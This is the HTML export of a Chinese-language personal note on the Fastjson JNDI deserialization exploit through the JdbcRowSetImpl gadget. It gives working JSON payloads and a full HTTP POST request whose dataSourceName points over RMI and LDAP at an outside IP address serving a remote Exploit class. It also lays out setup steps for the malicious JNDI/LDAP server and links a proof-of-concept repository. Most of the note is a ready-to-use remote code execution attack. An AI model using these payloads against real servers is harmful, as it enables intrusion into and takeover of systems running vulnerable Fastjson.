<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>基于：JNDI Bean Property</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>基于：JNDI Bean Property</h1><br/><br />这个Poc相对于TemplateImpl却没有一点儿限制，<br />当然java在JDK 6u132, 7u122, or 8u113补了是另外一码事<br /><br /><br />poc:<br /><div class="codebox"><div class="codebox"><span style="color:#000000;font-weight:400">{</span>&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://localhost:389/obj&quot;,&quot;autoCommit&quot;:true<span style="color:#000000;font-weight:400">}</span></div></div><br /><br /><br />服务端代码：<br /><br /><a href="https://github.com/shengqi158/fastjson-remote-code-execute-poc">https://github.com/shengqi158/fastjson-remote-code-execute-poc</a><br /><table style="display:inline-table"><tr><td><a href="EmbeddedFiles\521-fastjson-remote-code-execute-poc-master.7z">Linked file: fastjson-remote-code-execute-poc-master.7z </a></td></tr></table><br />使用方法：<br /><br />服务器端运行<br />JNDIServer，监听1099端口，并设置一个payload的web服务器，在web目录下放置Exploit.java的编译后的文件Exploit.class<br /><br />或LadpServer，监听1389端口<br /><br />payload发送：<br /><div class="codebox"><div class="codebox">POST&nbsp;/xxx&nbsp;HTTP/1.1<br />Connection:&nbsp;close<br />Content-Length:&nbsp;106<br />Accept:&nbsp;application/json,&nbsp;text/plain,&nbsp;*/*<br />User-Agent:&nbsp;Mozilla/5.0&nbsp;(Windows&nbsp;NT&nbsp;6.3;&nbsp;Win64;&nbsp;x64)&nbsp;AppleWebKit/537.36&nbsp;(KHTML,&nbsp;like&nbsp;Gecko)&nbsp;Chrome/72.0.3626.119&nbsp;Safari/537.36<br />Content-Type:&nbsp;application/json;charset=UTF-8<br />Accept-Language:&nbsp;zh-CN,zh;q=0.9&nbsp;<br /><br />{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://47.96.154.39:1099/Exploit&quot;,&quot;autoCommit&quot;:true}<br /><br />或<br /><br /><span style="color:#000000;font-weight:400">{</span>&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://47.96.154.39:1389/Exploit&quot;,&quot;autoCommit&quot;:true<span style="color:#000000;font-weight:400">}</span></div></div><br /><br /><br /><br /><p align="center"><img src="images\home.svg" height="22" width="22">  <a href="index.html">索引</a></p></div></body></html>